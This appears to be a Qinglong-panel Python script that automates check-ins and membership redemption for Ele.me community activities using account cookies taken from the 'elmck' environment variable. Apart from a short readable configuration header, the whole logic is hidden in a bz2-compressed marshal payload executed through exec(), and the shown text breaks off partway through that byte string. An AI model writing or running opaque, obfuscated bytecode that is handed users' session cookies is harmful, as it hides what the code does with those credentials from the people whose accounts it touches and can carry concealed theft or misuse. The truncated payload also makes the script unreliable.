from notify import send
import requests, time
import json, os, sys,re

'''''
@不才
new Env("饿了么社群")
cron 0 0 11,18 * * *
v1.741  优化ck识别，修复部分ck识别为失效，首次先按默认配置运行获取必要数据
饿了么社区签到换会员 7/16  新增自定义延迟，避免出现挤爆情况，默认3分钟
变量：elmck，多号&或者单独设置elmck（跟京东一样）隔开
python3.10
'''''

viplist = 1#0为只显示会员情况（可能有些不显示),如果第一次运行填写1显示全部奖励，以及兑换会员需要的数据
exchange = 0#1为开启兑换（第一次运行先填写0，viplist=1时获取所有数据后填写在下面后开启）
#上面填写1时，必须把下面的数据填上(你要兑换的奖励数据，也就是会员)，记得所有数据需要同一个账号的
sceneCode0 = "wrczVqEQAAdA2YuKUR2d-PGx2SOimmIA"
activityId = ''
actCode = ''

strActivityId=activityId


#所有号可以用同一个的数据兑换会员

version = sys.version.split(" ")
ver = version[0].split(".")
if int(ver[1]) != 10:
    print(f"你的青龙python版本为{sys.version},请使用py3.10运行此脚本")
delay = 180 #账号直接间隔时间，3分钟应该足够了
notice = True #关闭通知改为False
try:
	import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(bz2.decompress(b'BZh91AY&SY2\xf8\xa6t\x00\x07W\x7f\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\x18\x1f\x03\xbd\xbd];}\xdcw\xdb\xeen{\xed\xf7\xde|\xcf}3\xdf=\xf3\xb7m}\x1b\xdd\xed\xee}^\xf73\xef\xb3\xee\xb1\xdd|\xfa\x9fOn\xf0\xf1\x95\xdd\xef}\xc7\xd3\xbe\xf9\xbb\xdb\xda\xef\x9e\xf7\xbd\xddw[\xad\xf6\xef\xad\xed\xdc\xf7\xda\xdb\xe9\xcdg\xbb\xdb\xefr\x19U?\x14\xf1\x03\x11\x8d#\xd10\x98G\xa8\xc9\xa9\xe2z\x8c#OS\x06\xa6\x9af\xa3#*~\x03I\xe9\xa0F\x9az\x13L\x01\xa9\x8al\x8c&\x9a10\x08\xd3M6\xa6\rLj2i\x80J{F\x99\xaa~\x93\r4i\xa3M\x0c\x8c\x9ahi\xa6\x8d\x15\x0c\xaam\x14\xf6&LL&\x9e\xa1\xa6jh\xc4\xc1\xa4i\x84\xc4\xd3h\x98M\x1e\x9a&\x98&\x13&\x04jl\x00\x87\x91\xa4\xf44\x98\x02i\xa356\x8dLM\x89\xa6\xa6\xc14\x19\x13\x1aa4&ji\xa3&)\xe42\x0c\x08\x9b#\x02\x9e\xa8uO)\xe2\x9f\xa6\xa6L&\x99\xa6\x82`#M2\x9ei=\x08\xcd\x10\xc9\x82h\xd3\x14l#i1=\x00\x13M\xa0F\xc8\xd0\xd021\x1a\'\xa3MO&\x9a\x134i4\xc4\x9e\x98h\'\xa9\xa9\xb2di\xa6&\xa7\x94\xd9\x1e\x89\xa6\xa3\xcal\x98\xc8\x13\x142\xaa~\x98\xa7\x8dL*{C\t=\xa9O\xc0S\xc5O\xc2\x9e\x9af\xa9\xfa\x98\xd4\xd3#\xd2\x9bh\xd3\x08\xd4\xf1\x03\x13U?\xd3S\xc2\r\r1\x14\xf0\x9e(i\x8c\x8d*{\x00\x9a\xa7\xe3Q\xaa~\x83i56L\xa7\x94\xd8\xa7\x89\x84\xa7\xa3\xda\x9e\x84\xc1\x19S\xf2\'\xaa~\x8dS\xf2=&\xa9\xedO\xd2m*!OS\xf4$xi\x18\xd3)\xa9\xfaj\x9e\xd0\x9b*{M\x1a4O\x13L\xa9\xfa2L\xd3M\x00\x91\xe24\x9b\x14\xdeS4)\xb0\xa7\x88\xc2\x8f)\xfa\x99\xa2jz\x99\x89\x84i\xe4\x99\xea\x98\n6Q\xe3I\x9a\x02mS\'\x86\x80\x9ai\x80h\rL\xa7\x94\xd3i\x94\xf2\x8f$"\xa9\xb4\x08\xc2dM\xa6\x99\x06\x82d\xd4\xf12cD\xf5\'\x84\x1ad\xd3\t\xa3!\xe8\xd3I\xeaM\xb5\t\xe9\xe8&M\rO)\xe2L\xf5G\x90\xd00\xd14\xf4\x8d2d=M4Ojm"l\x13&G\xa4\x9e\x93\xd4\xf0M0L\xd2h\xc8\xc0\x84\xf2h2\x98\xe0\x84\x04\x00W\x01\xa0 >\x010\x1e\x0f\x00 \x0c\x06\x96\x90\x14 \x00\x04e\x08\x80LP\r:\x02\x01\x9d\xf8\x80\xf0(<b\x82U\xfe}j8"D\x1c\x08Ap\x08\x80+\x1dk\x887\xea\xa6\x05\x80V\xb2<\xbf\xa7\xa1oZ\t\xc9\x1de\x8c\x15\xfcf\xb0\x88@\x17\x91[\x0bXP_\x0epZ\xf2\xb7wFl&\xcb\xbb\x14\x06\x80g\r,\x0f\x9dX\xe0\x05o\x15b\xddjp\xba\xc0\xc2\x16\x19pP\xbe\xd2\xb1\xdfAG \x9f\xaf?Gb\xceE<\x89\x01\xaa\xe1?\x88\x98\xba\xa8\xc6`\xfev,\xe1\xad\xcf\xfe\xac\xca\xbd\xeb\xc0\xb0\x1d\x1be\xe9\xc3\x1a\xff\xb6\x10.\xdd\x16\x99\x08\x10i\x8al\xa4\xd20\x1b 0\x05n\x11\xb9\x96\'\x97}c\xc7-W"\x06\r,\xbf\xbb\xf1^\x13f\xd4\x81\xced\xab\x9fO\xec\xc4\ta~\xcc`\xc8\x02\xac\x84\x00?\xa6\x10\x17\xde;u\x1c\x1f\x9b\xcd*\xfd\x90\xa6\xf7[1\xff\x82\x05\xb4\xfe\xebo\xd5\x84\xee\x99c\x19\x88\x14\xb0\x00@\x13\xc6Wt\xf97\xf0\xe1*\xb1\x04O\xba\xc5\xa0\xb2\x9f\x01y\xde\xf9\xf1\x9c\xb1Z]\xec\xec-\x87R\xca%\xad\xdf?\x00\xedO\x9a\xffsF\x01\xec\x98y\xedv\xb4\xe1\xb1\x03\xc2\xb2\x0c\x14qA.\xfca\xf7\xd1iA\xff\\\xa0 \x00\xc2\xe3\xe6\x08\x98H\xcc\xcb\xd1SH\xb2\xc1*\xf0\x11r\x1el,\x95&\xe4\x9a\x00\xd5\xd1\xd7L\xbc\r\x06\x00w\xf7\xaeLi\xe7\xb3\xbb\x8c\xc7\x1b6h\x0b\xaa\x8d\x9f\xa23K\x05I \xfd\xbe\xe0?\x89\xf1\x9b\xde\xa1\xd4,\xbdb\xc7\xfa\xe4\xc3+\xca\xf5Ceb2\x12D\x00=\xf3D\xcd\xbfkTN\tQ\x9am\x01\x95\xc4j\xca~_<\t\xbd \x87pn]\x8c\xd9?6\xc7\xb5|\xdd\x08\xc1\xf4\x1e6\xf8\xbbqo?R\xde]U\xec\x1a\xf1m\xd1)E\xd6\xee\x15\xbc.\xd8\x85\xf2\xbbst\xb4\xc5\xef!\xa1uq\xa5\xb40\x94\x9a\xf0j\xd2\xde\xe1Wku\x87\xd4\xd5 V\'k\xc2\x14M\xbd2o\x91q\xee\x03\x8c\xc5\xbdW\x8f\xe0|:\xb4T\x1e\x9fTm\xbbe\x83\xdf\xd2\xd7cS[N\x13u\xbbf\xbf\x13,\xd2\xec\xda\\\x94v\x8e/\x13=\xdf<]\xaak5Y\x1dAV/D\x15\x85\xf1\xfc\x90\x93\x8a\n\xd12tZh\xd2\xe30\x04\xe55KR\xecR\x1bE\xeb\x89\x17=\x15&u\xdc\xdfr*\xdf@\xfba<\x88mo6\x1c\xcc\xea\x0c\t\xc3\xbc\xd3\x89\xca\x1a\x84\xef\x8d\xad\xa8q\xf1\x02lw\x1d\xe4\x156\x1d\x9c\x89D2\x87\xf9i\xf9_\xfbj\xa5f\\\x01\xff-\xf9\xd2\x17k\x0bK\x89\xee\xcfu\'\xc8<t\n\xd1U?\xb3\x18I\xa1\xf6\xa1\x98il/\xd3\x1bl\xb7y\xc0\xb8\x1c\x92\x14\xfe\x97\x8d\xde \xf8\'%\x9ceY\xd6t\x08\xe7^=\xbc\xd8\xe7\xb0Bd\x1ap\xdbpu\x9dx\x8e\xc6\x98\xc7\x19\x11\xa2\xd4\xd1\xfcbI\xbf\xc3\xc0,$\x08k\xdep@\xf3\xf3G\'va\xdc\xf6\x9a\xd9mi$<\x03\x91\xa2,%\xc1\xbd\xef\xe1\xac=\x82\xd6\xcd9\xf9\xca\xfe\xfa\x03\x08\x00x%\x7f\xb0\x9cK\xf1Ab\x08\xdaH\x8dc&\xe4 \xb01\xfb\x9d\x06\x99%?\x0f\xa9\xe4\xe4\xe6ng\x98\x8d\xf2*/\x8f\x0eg\xf5L_\xf0\xad]]\xcb(`|X\xb5P\xcf\xc3\xba\x9f\xa6X\xb4\xc0\xc0\xa6\xcds\xdb$\x1c\x97\xd3b\xb7M\xf0r\xc3/n\x89\r~\x92\xa7)\xc5n\xad\x84!V\x07\xeb\x08\x89\xd9\xae\x8dj\x0c\xa8\xb0\x01~\x8aZK\xc5\x18\xb1\x14\xfb\xe5\xa2\xe9\x1d\xcf\xe8\xc18\x16p\xa7\xe0\x80J\x8e\xaf\xe1\xf8\xa0=\xf6\x84\xa8\xdb \x9e\xfd\x00?\xb3\xcb\xd6\xd7`\x90\xdd\x8d\xcc#\xe9\xf4\xf4\xea\xfe9\xa5\xc5m\x13\xc2y\x882\x1c\x96\xfc>!\x1d\x85\xdd\xcbL@P\xd7}N5R9\xb6\n\xca\x07ZR\xf7o\xf6\x1a+\x8b\xbb\xb2\xde/\xed\xfa\x94\x81\xc7\xad\x97\xb1R\xb7Q\x05\xf1\x9cgE\xc3\x9e\x9eS\xdd$\xb3\x136\xab6o\xba\x1d\xbb\x16\xba-\xb6\xa64\x9b\x152\x85\xad\x86\xfc\xa6\xbcd2\xb7\x84\x8c\x19gy\x01#\x8d\xd4_\x89\x83\xa5\x15\x9a+m:D\x87/VW\xd7\xd9#\x07e\x19[\xaev\xa1\xc7\x05\xbe4\xf0\xc2\xbdY\xcax\x8d\xcf\x0f\xe9\xb6\xb1j\xd8\xc7w\x98C\xb9By\xa7D\xa52?\x0c$\xdb\xfb\x11\'\x06\x8d\xc2\x9enM6\xfe\\1{L\xcbQ]\x19d\xd5\x12\x8a\xa1\xcc\xfek8\xef\xd4\xb1=\x8cX\xe4Q\x88&\x1a\x18\xf3\xcd\xe5\xa7\x87\x9b\xfaB\x93\xac\xf8\x0b\xbf\x1b\xc88%\xdd\x1dv,\x1c\x80\xdf\xdbB\x17Z9\xed\xd3\xe5\xd58\xe0\x1c\xf2\xf7\xb3&b\xba\x12\x07\xc4\xe6\x1f\xb9\xb3\x82l\x0e\x98\x9e\xa9\x8b\xa2\x1b\xb3c\x08\xda\xb1\xac\x18\x9c\x1e:\xa1+\xa7Py\xce\x95s\xeeGb\rF\x93\x04\xde\xb7\xba%\xc9\x07\x0c\xb3\x88\\m]\xb8\x92\xf4\xee\xb5\xcb\x7f1\xf3U\x97\x86r=\xc3\xb9 \xa9\xf8I\xe31\xa6\x1e\xbc\x11\xb1\xabm\xd3a\x98\xcc\xc5\x1e\x1e\xd9\xb26\x93\xa4\xa3\xddU\xcc-\x18\xd2\x8em\xf0>EL\xef\xa2\xf4\xc6\xb7\x8e\xf9\xf5`\x80\x92\x8e\x03\xeb\x01\xd1u\xbc\xb6\x99P\xd2o\xb4\x93+S\xbe`\x96&\xb81\x0b\x95hVY\xf9\xa91\xeb\x8a+\xeda\xe1\xb0NM0\xe3H\x1d7\xcf\xf4\xb6\x97]?\x16U\x87\xbe\x9d{\xee\x1e\xbe\xf6\xf7g\xed\xc1\xea\x967\xeb\xe8Vv)\xff\xec~\x86\r\x0b\xf8\xb4\x13\x96.0\xdb\xa1\xa3E\xc6m\xe9{\xc6n\xd3\x8f\xb9\xf7|\xd3\xa9\xa0\xba\xba_\x86\x0cw\x85s\x14h\xe8\xc3f\x90R\\\xa4\'\xe0U\x8f%\x97*.M^\xdb\xb86g\x15\x014Z\x9d@Z\x8e\x1d\xdb\xa6\xe1\xfb\xca\xff\x85\xa6\xf7j\xb6\x08\xb4h\r\x89Nk`\xffV!\xb9/\xce\x94\xbb02OLS}f\x07t\xed\x1b\xea\xad\xfemf\xda\x1a8\xb7g|\xe9\xb1_\x7f\xc6\x0b\x7f\x84\xc4Zg+\x07rLgK\xab\xcb\xf8\xfc\xc3f\x1b&\xcd\xcc\'\xf2\x8ey\xe7\x80\x07K\x02z\xed4\x94\xb8\xa4y\xd7\xdfe\x82\xc0\xc8\xc1\xcb\xb3\x9f\xb6\xe0\x8c+t\xe4\xdb\x12H\xf1\xb6\xe8bX\x9b\xf7\xedI\x1b\xfc\xf5)\xa7\x94?k\xc3\xbf\x89\x11\x9c\xc5M\x02\xa5\xac\xb9\xc5Df\xccQ\x0c\xe1\x91\nW\x1c\xbc\xa8bF\xae+V\xbaD9\xc2q\x98\x9b\xd9\x82kkz\xe5Fk\xd5\xa1\x92\x1d\x169-\x0b+\xaa\x8cC\xe9 qmI\x10OIF\x16S?\xcbp\xdf$]\x9f\xf7\x82I\xa9\xe4\x93-W\xa4\x9d\xee*&N\xd2\xf4\xaf\xbcRzH\xbe4\xad=D\xbc\xb0\x12\x80\x0f~\x1c\x81\xaf>\x02\x94\x9b\x88\xa7\x14\x83m\xf1\xa1\xd1-\x11s:\xdd\xf4\x958\xf1\xd7\xc5\xfc;\xad2fGZ{\xa3V\xc6G\xa8]\x9f\xd0$[\x10\xd9)\x01\xe2\xd9.\xfe/\xae\x9fjN\xa9\x12\xd1\xfbdm\xc5\xe0\xd8\x89\x99\x8e\xbem\x95\xeeh\xdb}9\x97\xb7\x18\xbe\xfa\xaa\x1e=}\xa3\xe3\x03\xaa\x941!\x98\x87\xef\xeb\x18\x90\xf5\x8a\xd3>t{I\xe7\x1aHyr\xaf \x02-\xaa\x1c\xdd\x8d\x05w\xb0\x87\xe3\x1f9\xc5\xb4\x92\x07x {\x9ci\x02Q;\x12|^\xd3\xc1lV\x9b\xe7\xeavm\xb3\xfa\x9f\xab\xbe\xb6\xca\xb3\xdf\xe4\xc0>\x04:+8\xa8w\xf9.\xd9d\x1au\x01\t\x15\xbcl\xa3\x00l\x81Q\xc0r\xed/\x0fvZ\xd1?P\xd1\xa5\xf0\xf3=GeB\xff\xc8\x96&dW$z\n\xfe\xbc\x867~g,I\x9f\x82\xb95\xae1[_4\x1eJ\x16/Z\xe5\x9c_J\x80\xe3\xe2:\x94\xb7&\xd3\xbb\x86U\x85\xe7\xc0\xbb\x99\xdb\xeb\xb9\xba\x1b\xb4\xba\x83\xce\xe2\xb2T\xb0a-\t\xf7i\x13\x07\xd4\xd6-\xb7\xed\xcd=\x86W\x0f\x80\x95W\xa9\xbd\xa4\x12~\x0bTLt\x16\xa3\xccT\xafSc\xb1\x0c\xbcd\xd7(\xb3&\x1d+-e@y\x04\xdd\x9c\xf1\xd5 k)!\x80@\x95\xc9\xee S\xcdk\rX\x1c|\x97\xab1A1\x91?\xe3\xc8\xad\xa3Z\xc4Q^\xb2\x84\x91\xc8R\xf0\x9e\nw\xa2\xbc\xaax\xd6k\xb6\x87\x0c\xddk*\xc6P\xff\xae\x03\xaca\xfe\xfeD=\x1fH\xe7\xa2\xc1\x0b\xdbw\xf2i&\xd3\x8f\x02\xd3\x06\xdc\x87\xd5+_\x05\xb9\x8f\x81\xa5\xd7\xef\xdf\x95\xca\x85\x93\xc5\x08\xd70\xa6\x84i\xbfj6Z\xfb\x03\x9d\xe5\xbf\x9a\x95\x03s\xcf2]l%w,\xc33\xb7\xf6\x1cG\xf8Fg\x03glTj\x0f\xeb\xc2E\xbdP\x08\xb1\x9c\x8a\xe8\xe6\x9aH\x01\x97\x99\x1c\x8c\xbd\xb5\xf6::_\x9c\xe7\xedg)\xe3"\xc7\x8c\xc9\n^\x80\xb71GO_\xb0O\xc7-\xda\xe8\x0cH..\xaa\xe0\xa8\x89\xbbw\xaf\xe7\xae5y\x14r~\xbe0\x8b\xba\xcf\x99\'^\xa1\x7f\xe4\xf2\x99U\xaa\xf0\x17Zs\xa2s\x82X\xb6\xcc\xad\xf9\x91\x98\xec\xbc0dP\x84cb\x1a\xfc\x99_\x00\xde\x80:W\xa9\x8b\x99\x06\xf0\xb7\xa2\xff\xbb\x8b\x01\xf1\xd3\x8bY\xef!\xc8\xc2\x04\xd7t4\xd8\xc0\x00z\xe3\xc5\x1c\x8b\xe3\x97\x17]\r\x0cWz\xaf\x1e~8\xf1\x89CR\x89\xda\x04\xa6A\xd6u\xd8\xf1\x19\xd0\xaa\xa3X\xbezU4\xb6\x89`[!\x96\x14!\xb4>\x83\xf6\xda**\xaa\xf7\x18\x9c\x8e\x92b\x98\x9cv\xb0\x02\x85t\xae\xd1\x1agn{\xd5\xc8\xf8ep\'dP;\x88"\xe3\xf9\xff.\x8etx>)\x87\xa0\x95\xc2\xba\x87}\x9br\x10c\xad\x0f\x8d\xc5\xc9\xb1\xad\x97\x7f\xc6h\xa1\xd8T},>\xf7\x84\xbc\xfc\xb9#d\x83\x86\xa3\xd5\xd7\xdb\xec\xddL\xc2\x91U\xd2K:\xd8\xba1j\x03\x86(^/V\xf1\x07\x03\xbe\xe1\x9aTc\x85\xd5\xe6R\xc3\xbbB\xc9\\\x88J\xe9o\x84\xcc\xe4M\xd3w\x15y\xaf\xbf BP\xba\xfe\xca\x19\x15)\x08C\xae{\xbe\x9c\x8f\x9b\x06\xb3\xdb\xfd\xb3\xb2}&7K\xe2\x91\xad\xc1q\rIbA\xca0\x19\xe5\x87S4i\xf8\xa0\xe7X\x1f\xd2\xd4\x10\xb3"\xb3\xd0\x98q{\xbf\xcd\xbcc\xfd\x91\x95z\x82\x07\x8e\xc9R\xd8\xae\x12I\x88X\x94\xc9\xe0\xd5\x105\xb6\xcaV}\x84\xfa\xcfC\xe3k\x97\x9b)j\xe3#\xa8\xe0Xt\xd8\x93js\xad\xea\xa2\x9c\x87\xf5\xd7&m?y\xda(k\xd4\xb3#@w\x9ao\xd2u\xfa8,\xa1\xe3`\x1c\xfa\x88\xe6x\x0f$\xfc\x12i\x97.Q\x0c\x04\nh\xa2+\xb2\xc6{o\xfdm\xe6\x93@\xdd\x0b\xe5\xae\xb2\x1d\xa9\xe6\x04\xa5\x02@\x0e\xc3\xdb\x9dT{\xfc\xda\xfe\xb5\xa9\x85V:Y\xf2\xdes\x19\xb3\xf7_i\x17\xf4\x8a\xb6\xa0\xdfR\xba\x1a\xac\x1b6\x047B0\xb0\x1e\xac\x966\x95 \xf0i\x0cz=\x94\xf9\xea\xcd\xed-\x84\xdck\x99\x03-\t\xa1\xa1\xc2\xfc\xa6~O%\xf1`\xfe\xbc\xe3e\xa1 \xa0f\xb4\x1b@\xdb\x999\x1c\x1e\xf9\x1c\xb78t\\\x93\xf7S\x9b\x00\xaf\xb3e\xc9\xde\xdd\xd7\xf5\x95\x19OD\xa3\x96\xf8uJ\'\xe6\x01p\xd9|\x1d\xa9\xafFG\\cX\xa6\x8d\x06\xdd\xa9\x99GM8\xb3\x13\xc0\xdc\xf0\x87\x8b\xa9\xcc\x8c\xcd+\x95\xfc\xf0\xbeA\xcc\x7f\xeb\x15P\xa4w\xd8z\x1cl0\xbet\xcaS\xd4d\xafj\xbbN{\'\x0b\xf5\xb9\x18%\x03\xdb\xb1165\xb5\xc4\xf0\x01 \xebyp\xbeT\xc1t[\x8eH\xa24\x9b\xd7\xeb\x8eR\\\xec(\xab\xc4\x8d\x95\xb4\xaf]\xad\x89\xccFl\xa0\x12\xb2\xeaZ\r\x08\xf3\xd8\xc2\x12\xab:g\xbd\xd8\xffL\xcf\x96\x83\x81O\x0c\xf3\x15\xe4\xcc\xe4\xb13\xaec^&0\xd5\xab\x94.\x97ta\xac\\u\xfd\x99\xbf\x04d\xf0\xe1\x91_\xa45\x19\x1e\xf7\x1a\x10\xbem\xf6e\xdb\xba\x9bR\xbdRk\x9b\xcc\xd7H6\xa75\x01\xc6\x18\x00$s\xf5\xc6\xeex\x153\x050vo\x14\xdd\x83\xbe\xa2\xdfi\xfc2\xac\xce\x02GP[1j\xddF\x9co\x86\xe5\x0f\xef\xc5\xb7\xef\xd6\xea\xb1(-(tDZ\xd5E$-\xeb\r6\xc9\xba\xa6\xbb\xcf\x96\xae\x0e\x90\xf6\xaa\xc7\x83\xb2\xea\xdf\x03*\xe5o\x01H\x00#\xa4\x94e\xed\x0b\xd9\x96\x9644\x07\xd7\xde\xf8jT\x7f+\x0cIv{\xdao\xdb\x0f\x98\x8f\xcb.EB3~\xd0\x88u\x8b\x9b\xc2\x12r\xb0S\xb3e\x087j\xe1\x1d\xf8\xf7\x92\xe7\x85{t\xc6\xb4\xb9\x8f\xa9\xca|mo\xebjzv\x1d\xd1\xd9\xb7k\xbbR\\\xe2{D\xf5\x91B\xe7}\xe0eL\xd8\xf0\xf8%\xa3}\xdfR\xb7o\xde\x89)\xc0\x84\xa2\x88\xc3\xa0\x80\xee\xb9\x11\xaa\xef\xbbC\x1a\xf3\xc8\xd83[\x12\xdb\x14U\x86)IQ\xc01A\x1dmXM*W\x93\x02\t\xf2}\xb3\xaa\xf3\x86M\xb6\'\xb1\xd7\xfbPd\xbc/v\\\xae\x05`\xd0N\xfe\x0fC\xae\x1fN\xb3S\x161\xde\xd2\xd1\xb2\xb4\x0f\xc8\xe0\x1d\xc6\x17^-\x8e\x17\xb8\xe9\xfb\xb2\xcd\xa5\x0e\xf5\xc2\x867\x80?\x8b\xfa\xe2:\xd9\t\xf5\x0e0\xf9\xab\xf4\x88\x11_$O3\x85\x10\xba\xb9(\x97z\xac\x1d\xcf)\xd1\xf8\x9f=\xec\xed\xb8\xb9\x1d\x94\xec\xae\xe2\xd3G:\xb7\xa6\xe4\xcfR\xbe\x1d`\xcd\x03\x01\xbc\x08V\xc0\xf3A6\xe9\x1dw\x88p>\xf2`\x85\xb4\x9e\xba\x9f\xa2\x91\x1e\xd6\xbe\r\x0f\x88\xed>\xca\x19\xe8\xf0\x1a\x9dF\xa3\x9a\x0c\xdf&\xa7\xd6N\xf2\xe5\xcf\xd1|\x07%\xfd\xab\xe9\xec\xbda\x06\xc9\x7fJnpz\xd2/\x17\xaf\xd2\xfb\x83q\xb9N\xceE \x98\x89\xf0x\x9e\xec\x91\x13Q\xad\xb9\xd1\xb0p\xb0\xeak\xb9\x1b=\x01lg\xfd\x9e$c\xb9\x8e?\xdb\x05|K\xc9d`\xc4\x160m\xc3\xa8)_A]&\x7f\x94\x8a\x87\xe8\xf4\xb8j\xab\xd4k\xe1\xc8\xe8\xb9\xdf/\r\xc9$\xc0\x159\x87\xf5\x80\xe3>\xfai\x87\x9a-\xf8\xce\xa7I\n\\\xa7n1\x0bu\xa0\x92\xa5\xf9T\xb5\x98\x0c\x8d\x87`\x05v;X\xd2\x84u\xb1\x00\x04}G\xbd\xf1\x9e\xdd\xb2\xda\xd5\\\xfd^\x1aT\xd9H\x83\x98h\x0b4\x1d1\xbc\x84\n\xd0\xe3\xf7\xac\x90e\x9c\xd1+\xfc\x14n\xd2\xfb\x97#\xf3\x9d\x0f\xa8\xb6\xcc\xd7}\x83@[\xf0\x120\xfa\xf4\x9f.\xe5^\x90\xa3>\xc0\x11&\xe9\xd5|_S\xc3\xdf\xc6\xbf\xeaJ\xfb\n\x15\x03\xfb\x88\x03>\xd0\x06p;~P\x03Y\x84\xe0n\x1f\x8a\xe8fL\xff\xb0\xf6\x9c06v\xeeP$\xfb\xbd\x19\x04\xf0\x81x\xc9\x88\xda\x9fz\x03\xd7f\x05\xd5u\xdb\xb4\xe2S\x1cL\xaak`\t\xa0R\x87\x8d\xd3(\xb8\xa0\'\xe5-U\xd5\xcd\xdc\xc0a\xd1\x8e\xc3\x17\x9b\x9e\xea\x86@\x00\x01`\x13\xf6\xaa\xea~\x12\x14\x19sr\xac\xf3\xc4\x83\xb5\xeb\xf6S7\xb71\x80y\x00\xa09\x01`>4\x15\x95\xa6N\x07\xec\xd4\x18+(\xcd\xbeI`\xc6\xbd\x13+7\x83C\x99A*\x00`#\x00\x15"\xd1\xc11\x8d3\xdcW\xb0\xc8{L0\x80\xb8\x0b\xc7\xd2\x00`\x0c@3\xe8\xc5\xfeT\xae\xf2$xG\x91\xd8\x1c\x005\xf3ta\xdf\xb2\x90\x1d\xf0\x0f,\xf7\x7f\xc06z\x80K0\xde\xce\x91\xb1\xea\xd3\x0cS\x1b\xaf\x83n[4\x9d\x18i\x0c\xc0\x0f\x89m\xdc\xb6\xf9\xb4>\x0ez\x82X%\xcb;\x9e\xe6|D\xeb6W\xf8Sz\xd2\xe6\xc8\x8e\xd6N\xca\xd4 \xc4x\xc4\xd6p/\xca3\xc9\xaa\xe0/\xac\xe7?\xaeY\x9b5\xd2~id\x082x\xd6L\x97\x92\x0c\xb0\x12b\'=\x99\xdd\x9a\xe1h;=\x0c\xb6\xdd}\xab`9K\x89\x94\x14\xd1\xcd\x12d+\xe6\xf7\xbb\x9e\x17;\xabE\xbb:,\x8e\xf3]\xdd|\xf5i\xaa\xa9\xd81\xf1\xf7\xd8\xc9\x99\x98\x11\xae\xb0\xeb\xf9[\xe1\xdc0\xf9(\x0e\x07X/A\xbf*\xbe\x8d\xe6%\x8e1\xec\x9c\xc4\xd1f\x16\xdc\xb3\x1d\x8a0\xc2\xf7b#C\x04\xa1\xad\x97S\xc5p\xb2N\xe8Ny\x83,\xcc\x17|\xdf\r\xdf\xdfo*%#*\x17c\xc9\xfa&\xfa\x8d\xa6\xfc\x9c\x89%L\x1e\xd7x\xca\xf4\xf7\xfc\xfd\xa77c\xeb\xb6[\xb6j\xfaa\xee\x0b\xc0\xcb\xa8\xc9R\xc5hx~\xbfNF\x0b\xaf\x7fd\xad\x11!=\xe0v\xcccv\xeaf*\xdba&\x00\x07\xf4\xe4-(\xe0\xfb\xf6\xc8\xc4YV\xb2\xcb\xb2\x92x\x8b\xa1\x02\x15!q\xfb\x86\x8ffyR\x97U"\xae\xe4\x03\xe2|_3\xbe\xe5P\x88d\xee\xdeg\xef\xae\xb9R\xdc\xca?\xcckM\xe2\x03@|-\x03\x9bGg\x043G6-\xec\xbcr\\F\xff\xbf\xd6>"\xd9\xd7\x9d,\x9f\x8c\\\xb4\xff\x93:P5;\x9eL.\xa4rh\xd4\xbd\x0b\xd47\x8e\xec\x88mU\xc2\xb1\\53\x91\xd7\xda\xf9\xf4\xb7\'m\xe2\x10P\xef[\xd3xh!\xe5\x90\xf5\xb1\x8av;g\xd7USM\x80\x1b\xf4\x01V\x03\xa7\x1a\xde>5\xdbNb t/J\'V\x16\xec]\xd3\xf4\xaat)\xfa8\xcb\xd1\xc5I\xf8\x08\xab=\x8c\xcaB!\xccp\xf3\x8a}\xbd\xf4\xad\xf9\x00\x95\xe9\x06\xa9s\x13\x02TY\xcd\xd30\x1d\x85\x1a\'\n\xa2\xec\x89\xa9\xab.\x1b\xd6x@\x1d$\xad\xd6\xb9\x81Z\x1f,y W6\x1c\xe9\x8bkB\xff^\x04\xee H\x13\xb5\x863\xdd\\Y\x8cI\x00#\xcd\x83\x85\xb0\xe9t(0\xc1\xb3\x9e\x16\x8e<\xb1\xbe\xc2\xee\x8b\xbe]\x89\xb1\x9b\x88{ls\x01\x1d\t\xe0\x93[E7/\x92\xb0\n{\xd4\x80\xbe\x10!~\xa30\xfc\xd0[\xf7\xde\x9f1\x10:\xa5@\x0c(%3\xdfX\xdd\xbb\x9e\xb0\x8dX\xeb\xc7\xe7\x03JZ6\xe7\xb2:\x1f\x07\\\xe7\x04\x10\x97\xf6\xb1mu\xacI\xc0X}\xe7]\xd2Y\xaaI\xf0&I\x89\xfd3\xb4\x11\xed\x92\xe4z\x85\xe8N;\xd7X\xa5\x8eb\x87\xfc\x1e\x8eM\x9es\x98\x1b z[(K\xf2\xf4rMc\xbcM\xdf\xd5\xaeI|\x11\x9e\xaf\x98 \x99%6\xa5|\xcb\xdc\x9dn@d]jUzO\xe3\x87\x19\xa2M\xcb{r\xef\x0e\xc1X36\xfba\xcd\xf0\xd7\x95\xf4\xc8?`\xd4\xe5\xe5a\x13\x1el\xf7rs\x86=\x0f\x1b/\x92\x06\x98/[G\x9a\xb0e\xd4\xe5t\x94n\xe3\x91V&\xb4\xaa\x8fZ\x83\xa8\r\xca\xd5Y\x88.\xa5T\xd0\x07\xfdH\xf9m\x1f\x94\xfe\x0e)\xd6\xeb\t\x9e\xe1d\xce\xee\xc5\x90`\x8c\x8d\xa2\xe9?\x9e\xe5\x08\xee"\x1eO4\x00\xda\xa9Hw\xd9\xd4}\xf7\xae\xcc4\x9f\xb0\xc88\xeb\x1e\x0cQ]\xa1\xf5\xb9B\xe1xz\xa6\xca\xc1G\x17\x9c\x14\xed\xe6\x84\xd7\x0b\x94\x04\xe2\xa8B[6\xa2\x99\xe6@\xeeJ\x01r\x07\xfe\xef~mn\xb0!\xd0\xde\x10\xa0?_\x14ab\xaf\x97/\xd1G\x02\xf1\xcf\xd1,\xf1\x7f\x93\xbc\xc5\x89\xdbV\xc2\x1dQ\xf7\xca\xc3\x9a\xc4\xa6\xd6/xYbJ\n\xdf|\x81,\x14VV7j\x83c\x9d\x06Y/\x0f\xdab,t\xce+e\x8f\xb8\xd4<\x96<L\x8fb\x94\xea\x03\xa9\xc3nx\x8dL\xcc_\xadR\xb8\xdf\x95\x92\xa2\xa9\xc8\\Tax\xe0*\xe4\x81{GCfl\xb8\xc5}\xfbV`\x9a=\xf5\xf1\xa8\x98\x85D\xf3~lvf\x0b\xc1\xf1\x14Cs\xe6\x1f>\x8ee\xfe\xf6s\x98f/\xfb\xf3\x11\xae\xa2K\xcd\x8b\xefq\xcd\xa4*[\xb4\xc7\xdc\xc2b%\xd9\x9f\xa8\rl\xb6\x1aw4\xb8\x89\x8a\xd8\xe0?>\xbd\xd6\x1e\xb9\xf6\x8a\n5T\xa8t)0;4